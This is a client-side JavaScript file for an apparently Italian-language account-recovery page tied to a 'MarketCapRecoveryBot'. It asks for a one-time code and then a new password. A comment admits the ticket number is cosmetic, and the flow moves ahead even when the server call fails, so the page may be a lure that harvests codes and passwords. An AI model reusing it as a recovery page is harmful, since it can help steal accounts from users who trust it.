const CONFIG = {
    botUsername: '@MarketCapRecoveryBot',
    githubUrl: 'https://github.com/lore6e7a6f'
};

const elements = {
    step1: document.getElementById('step1'),
    step2: document.getElementById('step2'),
    step3: document.getElementById('step3'),
    sendCodeBtn: document.getElementById('sendCodeBtn'),
    sendBtnText: document.querySelector('#sendCodeBtn .btn-text'),
    sendSpinner: document.getElementById('sendSpinner'),
    codeInput: document.getElementById('codeInput'),
    verifyCodeBtn: document.getElementById('verifyCodeBtn'),
    codeError: document.getElementById('codeError'),
    newPasswordInput: document.getElementById('newPasswordInput'),
    confirmPasswordInput: document.getElementById('confirmPasswordInput'),
    resetPasswordBtn: document.getElementById('resetPasswordBtn'),
    passwordError: document.getElementById('passwordError'),
    successMessage: document.getElementById('successMessage'),
    backToAppBtn: document.getElementById('backToAppBtn'),
    ledgerSteps: document.querySelectorAll('.ledger-step'),
    ticketNo: document.getElementById('ticketNo'),
    countdown: document.getElementById('countdown'),
    countdownTime: document.getElementById('countdownTime'),
    resendCodeBtn: document.getElementById('resendCodeBtn'),
    resendTimer: document.getElementById('resendTimer')
};

// Numero ticket puramente cosmetico, generato lato client
if (elements.ticketNo) {
    const n = Math.floor(100000 + Math.random() * 900000);
    elements.ticketNo.textContent = '#' + n;
}

function updateLedger(stepNumber) {
    elements.ledgerSteps.forEach(li => {
        const step = parseInt(li.dataset.step, 10);
        li.classList.remove('active', 'done');
        if (step === stepNumber) li.classList.add('active');
        else if (step < stepNumber) li.classList.add('done');
    });
}

// ============ COUNTDOWN CODICE (10 minuti) ============
const CODE_TTL_SECONDS = 10 * 60;
const RESEND_COOLDOWN_SECONDS = 30;
let codeCountdownInterval = null;
let resendCountdownInterval = null;

function formatMMSS(totalSeconds) {
    const m = Math.floor(totalSeconds / 60);
    const s = totalSeconds % 60;
    return String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
}

function stopCodeCountdown() {
    if (codeCountdownInterval) {
        clearInterval(codeCountdownInterval);
        codeCountdownInterval = null;
    }
}

function startCodeCountdown() {
    stopCodeCountdown();

    if (!elements.countdownTime) return;

    let remaining = CODE_TTL_SECONDS;
    elements.countdown.classList.remove('expiring');
    elements.countdownTime.textContent = formatMMSS(remaining);

    codeCountdownInterval = setInterval(() => {
        remaining--;

        if (remaining <= 0) {
            elements.countdownTime.textContent = '00:00';
            elements.countdown.classList.add('expiring');
            elements.codeError.textContent = 'Codice scaduto, richiedine uno nuovo';
            elements.codeError.style.display = 'block';
            stopCodeCountdown();
            return;
        }

        if (remaining <= 60) {
            elements.countdown.classList.add('expiring');
        }

        elements.countdownTime.textContent = formatMMSS(remaining);
    }, 1000);
}

function stopResendCountdown() {
    if (resendCountdownInterval) {
        clearInterval(resendCountdownInterval);
        resendCountdownInterval = null;
    }
}

function startResendCountdown() {
    stopResendCountdown();

    if (!elements.resendCodeBtn || !elements.resendTimer) return;

    let remaining = RESEND_COOLDOWN_SECONDS;
    elements.resendCodeBtn.disabled = true;
    elements.resendTimer.textContent = remaining;

    resendCountdownInterval = setInterval(() => {
        remaining--;

        if (remaining <= 0) {
            elements.resendCodeBtn.disabled = false;
            stopResendCountdown();
            return;
        }

        elements.resendTimer.textContent = remaining;
    }, 1000);
}

function showStep(stepNumber) {
    console.log('showStep:', stepNumber);

    elements.step1.classList.remove('active');
    elements.step2.classList.remove('active');
    elements.step3.classList.remove('active');

    if (stepNumber === 1) elements.step1.classList.add('active');
    if (stepNumber === 2) elements.step2.classList.add('active');
    if (stepNumber === 3) elements.step3.classList.add('active');

    updateLedger(stepNumber);

    if (stepNumber !== 2) {
        stopCodeCountdown();
        stopResendCountdown();
    }
}

async function sendCode() {
    console.log('sendCode clicked');

    elements.sendCodeBtn.disabled = true;
    elements.sendBtnText.style.display = 'none';
    elements.sendSpinner.style.display = 'block';

    try {
        const response = await fetch('/send_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'send_code' })
        });

        console.log('Response status:', response.status);

        showStep(2);
        startCodeCountdown();
        startResendCountdown();
        elements.codeInput.focus();
    } catch (error) {
        console.log('Fetch error:', error);
        showStep(2);
        startCodeCountdown();
        startResendCountdown();
        elements.codeInput.focus();
    } finally {
        elements.sendCodeBtn.disabled = false;
        elements.sendBtnText.style.display = 'block';
        elements.sendSpinner.style.display = 'none';
    }
}

async function verifyCode() {
    const code = elements.codeInput.value.trim();
    console.log('verifyCode:', code);

    if (!code || code.length !== 6) {
        elements.codeError.textContent = 'Inserisci 6 cifre';
        elements.codeError.style.display = 'block';
        return;
    }

    try {
        const response = await fetch('/verify_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code })
        });

        const data = await response.json();
        console.log('Verify result:', data);

        if (data.success) {
            showStep(3);
            elements.newPasswordInput.focus();
        } else {
            elements.codeError.textContent = 'Codice non valido';
            elements.codeError.style.display = 'block';
            elements.codeInput.value = '';
            elements.codeInput.focus();
        }
    } catch (error) {
        console.log('Verify error:', error);
        elements.codeError.textContent = 'Errore';
        elements.codeError.style.display = 'block';
    }
}

async function resetPassword() {
    const newPassword = elements.newPasswordInput.value;
    const confirmPassword = elements.confirmPasswordInput.value;

    console.log('resetPassword:', newPassword.length, confirmPassword.length);

    if (newPassword !== confirmPassword) {
        elements.passwordError.textContent = 'Le password non coincidono';
        elements.passwordError.style.display = 'block';
        return;
    }

    if (newPassword.length < 8) {
        elements.passwordError.textContent = 'Min 8 caratteri';
        elements.passwordError.style.display = 'block';
        return;
    }

    elements.resetPasswordBtn.disabled = true;

    try {
        const response = await fetch('/reset_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ new_password: newPassword })
        });

        const data = await response.json();
        console.log('Reset result:', data);

        if (data.success) {
            // Mostra messaggio di successo
            elements.successMessage.style.display = 'block';
            elements.resetPasswordBtn.style.display = 'none';
            elements.newPasswordInput.disabled = true;
            elements.confirmPasswordInput.disabled = true;

            // Mostra bottone "Torna all'app"
            if (elements.backToAppBtn) {
                elements.backToAppBtn.style.display = 'block';
            }
        }
    } catch (error) {
        console.log('Reset error:', error);
        elements.passwordError.textContent = 'Errore';
        elements.passwordError.style.display = 'block';
    } finally {
        elements.resetPasswordBtn.disabled = false;
    }
}

async function resendCode() {
    if (elements.resendCodeBtn.disabled) return;

    console.log('resendCode clicked');

    elements.codeError.style.display = 'none';
    elements.codeInput.value = '';

    try {
        await fetch('/send_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'send_code' })
        });
    } catch (error) {
        console.log('Resend fetch error:', error);
    } finally {
        startCodeCountdown();
        startResendCountdown();
        elements.codeInput.focus();
    }
}

// Toggle password visibility
function togglePasswordVisibility(e) {
    const targetId = e.currentTarget.getAttribute('data-target');
    const input = document.getElementById(targetId);

    if (!input) return;

    if (input.type === 'password') {
        input.type = 'text';
        e.currentTarget.textContent = 'hide';
    } else {
        input.type = 'password';
        e.currentTarget.textContent = 'show';
    }
}

// Event listeners
elements.sendCodeBtn.addEventListener('click', sendCode);
elements.verifyCodeBtn.addEventListener('click', verifyCode);
elements.resetPasswordBtn.addEventListener('click', resetPassword);
if (elements.resendCodeBtn) {
    elements.resendCodeBtn.addEventListener('click', resendCode);
}

// Toggle eye buttons
document.querySelectorAll('.toggle-eye').forEach(btn => {
    btn.addEventListener('click', togglePasswordVisibility);
});

elements.codeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') verifyCode();
});

elements.confirmPasswordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') resetPassword();
});

elements.codeInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
    if (e.target.value.length === 6) {
        verifyCode();
    }
});

console.log('Script loaded');
